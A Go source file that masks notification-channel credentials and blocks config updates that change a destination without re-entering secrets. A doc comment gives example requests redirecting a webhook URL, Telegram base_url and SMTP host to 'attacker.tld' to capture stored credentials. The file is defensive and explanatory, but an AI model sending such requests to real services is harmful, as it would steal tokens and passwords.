package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes a credential it replaces the real content with a value that starts with this prefix.
// An update that sends a value with this prefix means "keep the stored original".
//
// A prefix is used instead of an empty string or a fixed constant so a little identifying information can ride along
// (see MaskedValue). The user can tell which robot it is without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue builds a masked value:
//
//	"__masked__"              the original is too short, so there is no hint
//	"__masked__:…ab12cd"      the last 6 characters of the original, as a hint
//
// Showing only the last 6 characters is deliberate. The identifying part of a webhook URL is the tail
// (a WeCom key, or a Feishu robot id), and the prefix is the same for every robot. Six characters are not
// enough to recover the credential, and they are enough for the person configuring it to recognize "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value, meaning the API echo was not edited.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields replaced by masked values.
//
// An unknown channel kind returns an empty map instead of the original config. The UI showing "config unavailable"
// is better than echoing raw content that may contain credentials when the kind cannot be recognized.
// Non-credential fields are kept as-is so the UI can still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure such as headers is treated as one credential. Judging each child key would require every channel to declare which children are secrets, which costs more than it returns.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed and the caller did not state the credential fields.
// It is returned instead of silently allowing the change or silently dropping the credentials. See PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys that were not stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "The destination (" + strings.Join(e.Changed, ", ") + ") changed. Re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or leave them empty if a credential is no longer needed. " +
		"The old credential is valid only for the old address. Keeping it would hand it to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the sensitive case of a destination change.
//
// It replaces a bare MergeConfig on the channel-update path. The path it closes is this one, which works in practice:
// the destination (where the message goes) and the credential (which identity sends it) are separate fields, and MergeConfig
// keeps the stored value for any key the request does not mention. Anyone who can PATCH a channel can change only the
// address, say nothing about the credential, and make the server send the stored credential to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → after STARTTLS, the username and password are handed over
//
// The path is silent and does not depend on a redirect, so refusing a cross-host redirect does not stop it.
// It also defeats the point of masking in this package, which is that credentials are not echoed to the browser.
//
// Rule: once a destination key is changed to a new value, the caller must state every credential key:
//   - a new value is used as given
//   - an explicit empty string means the field no longer needs a credential (the clear semantics stay)
//   - sending the masked value back, or omitting the key, is refused
//
// The third case is refused because a masked value means "keep the old credential", and the old credential is valid
// only for the old address. Credentials are not dropped automatically. For an optional credential
// (webhook headers, the email password) that would silently become "no auth, but the API returns 200", which is harder to diagnose than an error. The operator fills the field again.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential (webhook headers are an object) contains a mask literal, the caller nested the
	// "keep the original" sentinel inside a structure. MergeConfig only treats a string with the prefix as a mask.
	// This shape would be stored as an ordinary object, so the literal "__masked__" lands in the database,
	// later auth fails silently, and nothing reports an error. Refuse it.
	//
	// This check has to come first. When the address did not change the function returns early, so a later check
	// would only cover the "address changed" path. The first version placed it wrong, and a test caught it.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that really changed. A masked value means "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change. Merge normally: a masked value keeps the original, an empty string clears, and everything else overwrites.
		return MergeConfig(stored, incoming), nil
	}

	// The address changed. Every credential key must be stated.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses a mask sentinel nested inside a non-string structure.
//
// Masking assumes the whole value is a string. An object field such as webhook headers can only be masked as a
// whole (the string "__masked__") or submitted as a whole. Nesting the sentinel inside the object does not mean
// "keep it", and it would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: leave the whole field empty to keep the stored value, or submit a new value for the whole field. A mask placeholder cannot be nested inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue reports whether two config values are equivalent. Comparing JSON encodings also handles
// type differences: the frontend submits a port as a number, the database reads it back as float64, and == would misjudge them.
//
// "Empty" is normalized before the comparison. An empty string and a missing key are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without that normalization, an
// optional destination that is always left blank (Telegram's base_url is the only such field: blank means the official
// address) follows this path:
//
//	a create stores base_url:""  →  the first save deletes the key in MergeConfig
//	→ on the second save incoming is "" and stored has no key, which is judged as "the address changed"
//	→ the credential is a masked value → 400 "the destination changed; re-enter the credential fields"
//
// Every later save then fails unless the user pastes the bot token again, even though nothing changed.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is empty.
// The rule has to match MergeConfig's clear check (strings.TrimSpace(s) == "").
// Otherwise MergeConfig would delete a value that sameConfigValue still treats as present.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for a channel-config update.
//
// Rules:
//   - a masked value in incoming keeps the stored original (the user did not change that field)
//   - an empty string in incoming is an explicit clear, and the key is deleted
//   - every other key is overwritten with the incoming value
//   - a key in stored that incoming does not mention is kept (partial update)
//
// Whether an empty string means "clear" has to be explicit. A frontend form submits an unfilled field as an empty string.
// Writing that as a real value would wipe a field the user left blank in order to keep the original.
// An explicit clear is used because clearing a field that was set wrong has no other expression
// (omitting the field could distinguish "not provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // a masked value means unchanged; keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
